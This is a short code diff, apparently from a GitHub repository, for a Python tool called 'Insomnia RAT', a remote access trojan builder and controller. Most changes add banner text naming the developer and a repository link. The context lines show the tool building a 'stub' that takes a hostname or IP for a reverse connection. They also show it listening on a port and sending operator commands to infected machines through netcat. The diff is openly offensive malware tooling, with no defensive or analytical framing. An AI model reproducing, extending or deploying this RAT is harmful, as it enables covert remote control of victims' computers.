@@ -7,8 +7,7 @@ def helpSec():
 
 while True:
 	os.system('clear')
-	x = raw_input("""
-\033[91m\033[1m\n[Insomnia RAT]\n[Developer: Hari Patel @ hari.p.2212@gmail.com]\033[0;0m
+	x = raw_input("""\033[91m\033[1m\n[Insomnia RAT]\n[Developer: Hari Patel @ hari.p.2212@gmail.com]\n[Github: https://github.com/Hari-P-22121/InsomniaRAT]\033[0;0m
 \033[1m
 [1] Build Stub
 
@@ -19,6 +18,8 @@ while True:
 Select any option:""")
 	if x == '1':
 		os.system('clear')
+		print("""\033[91m\033[1m\n[Insomnia RAT]\n[Developer: Hari Patel @ hari.p.2212@gmail.com]\n[Github: https://github.com/Hari-P-22121/InsomniaRAT]\033[0;0m
+\033[1m""")
 		stubName = raw_input('Enter name of stub: ')
 		os.system('clear')
 		hostName = raw_input('Enter hostname/ip for reverse connection: ')
@@ -74,6 +75,8 @@ end repeat"""
 					os.system('clear')
 	elif x == '2':
 		os.system('clear')
+		print("""\033[91m\033[1m\n[Insomnia RAT]\n[Developer: Hari Patel @ hari.p.2212@gmail.com]\n[Github: https://github.com/Hari-P-22121/InsomniaRAT]\033[0;0m
+\033[1m""")
 		portListen = raw_input('Enter port number to listen on from 1024 to 65535: ')
 		os.system('clear')
 		print('Listening on port ' + portListen + '...')
@@ -102,6 +105,7 @@ end repeat"""
 				v = 1
 			os.system("echo \"" + cmdd + "\" | nc -l " + portListen)
 	elif x == '3':
+		os.system('clear')
 		quit()
 	else:
 		os.system('clear')
